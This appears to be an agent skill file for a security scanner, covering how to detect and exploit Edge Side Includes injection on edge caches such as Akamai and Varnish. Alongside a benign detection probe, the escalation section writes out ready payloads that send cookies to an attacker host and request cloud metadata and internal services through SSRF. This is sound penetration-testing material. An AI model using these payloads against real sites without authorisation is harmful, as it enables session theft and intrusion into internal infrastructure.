---
name: offensive-esi-injection
description: "Edge Side Includes (ESI) injection detection and exploitation. Identifies Varnish/Akamai/Fastly/Squid edge caches that parse ESI tags from user input, leading to cookie exfiltration, SSRF, and XSS via include directives. Adapted from active-scan++."
---

# Edge Side Includes (ESI) Injection

## What ESI Is

ESI is an XML-based markup language standardised in 2001 (W3C note) for
edge-cache content composition. Edge servers (Varnish, Akamai, Fastly,
F5 BIG-IP, Squid, Oracle Web Cache, CloudFront with Lambda@Edge) parse
ESI tags in HTML responses *before* serving to clients, fetching
fragments from origin or inserting variables.

Three commonly enabled directives:

```
<esi:include src="https://internal-service/widget" />
<esi:vars>$(HTTP_COOKIE)</esi:vars>
<esi:choose><esi:when test="…"></esi:when></esi:choose>
```

If user input reaches the response body without sanitisation, the
attacker injects ESI tags and the edge cache executes them.

## Why It's Exploitable

Three primitive exploits, each high-impact:

1. **Cookie exfiltration**
   ```
   <esi:include src="https://attacker.tld/log?c=$(HTTP_COOKIE)" />
   ```
   The edge fetches the URL with the victim's cookies in the query
   string — captured server-side. The fetched body is then *included*
   in the response, but the cookie has already leaked via the URL.

2. **SSRF to internal services**
   ```
   <esi:include src="http://169.254.169.254/latest/meta-data/" />
   ```
   The edge sits inside the cloud VPC; AWS metadata, internal admin
   panels, and service-mesh endpoints become reachable.

3. **XSS bypass**
   ```
   <esi:include src="https://attacker.tld/payload.js" />
   ```
   The included content is inserted into the response — no quote
   escaping required, no CSP applies (the cache speaks pre-CSP).

## Detection (What the Scanner Does)

`modules/esi_injection.py::scan_esi(url, params=…, form_fields=…)` injects
a benign sentinel tag into each input and checks the response:

```python
payload = "<esi:vars>esi{TOKEN}-INSIDE</esi:vars>"
```

Three outcomes:

| Body contains | Diagnosis |
|---|---|
| `<esi:vars>` + raw token | Reflected XSS, ESI **not** processed — flag as XSS, not ESI |
| `{TOKEN}-INSIDE` without `<esi:vars>` | ESI parser ran — **vulnerable**, finding emitted |
| Neither | Input dropped or rewritten — not exploitable |

Default probes against common parameter names (`q, search, page, name,
id, msg`) and any explicit `form_fields=` / `params=` passed in.

## Manual Escalation After Detection

Once ESI processing is confirmed, escalate by hand:

### Step 1: Confirm cookie reachability

```
<esi:vars>$(HTTP_COOKIE)</esi:vars>
```

If the cookie value appears in the response, the edge has access to it
(some configurations strip cookies before ESI processing).

### Step 2: Out-of-band exfiltration

Set up an attacker-controlled host (or use Interactsh / Burp Collaborator
/ our OOB module):

```
<esi:include src="https://oob.attacker.tld/?c=$(HTTP_COOKIE)" />
```

Watch the attacker logs for the inbound request.

### Step 3: Internal recon (SSRF)

Common edge-internal targets:

```
<esi:include src="http://localhost:8080/" />            # admin port
<esi:include src="http://169.254.169.254/latest/" />    # AWS metadata
<esi:include src="http://metadata.google.internal/" />  # GCP metadata
<esi:include src="http://kubernetes.default.svc/" />    # k8s API
<esi:include src="http://consul:8500/v1/agent/self" />  # Consul
```

### Step 4: ESI variable manipulation

Some engines expose more `$()` variables:

```
$(QUERY_STRING)             # full query string
$(HTTP_USER_AGENT)
$(HTTP_REFERER)
$(REMOTE_ADDR)              # client IP
$(SERVER_NAME)              # internal hostname
```

## Edge Engine Behaviour Differences

| Engine | Default ESI | `<esi:include>` | `$(VAR)` |
|---|---|---|---|
| Varnish | off (need `vcl_deliver` esi.process) | ✅ when on | ✅ |
| Akamai (ESI) | **on by default** | ✅ | ✅ |
| Fastly | off (need `set req.esi = true;`) | ✅ when on | ✅ |
| Squid | off (need surrogate-capability) | ✅ when on | partial |
| F5 BIG-IP | off | ✅ when on | partial |
| CloudFront + Lambda@Edge | depends on Lambda | depends | depends |

Akamai is the easiest to find vulnerable — many sites enable ESI
processing implicitly via Akamai's default ESI profile.

## Defences You're Testing Against

* Edge config disables ESI for user-content responses
* Edge config strips Surrogate-Capability response header so origin
  doesn't emit ESI tags in the first place
* Origin escapes `<` `>` `=` `"` `'` in all user input rendered to HTML
* CSP `default-src 'self'` blocks the include's *result* from executing
  (XSS path mitigated, but cookie exfil via URL still works)

## Real-World CVE / Blog References

* https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/
  (canonical writeup with cookie + SSRF demos)
* CVE-2018-7669 — Varnish ESI cookie leak
* CVE-2019-12492 — Akamai ESI cookie disclosure on classic configurations
* https://github.com/PortSwigger/active-scan-plus-plus (the inspiration
  for this scanner's probe)

## Reporting

For each ESI finding include:

* The vulnerable parameter name + method
* The benign sentinel payload (what we sent, what came back)
* Suggested exploit payload (cookie exfil + internal SSRF samples)
* Edge cache fingerprint from response headers (Server, Via, X-Cache)
* Whether a CSP is in place (mitigates XSS-via-include path but not
  cookie exfil)
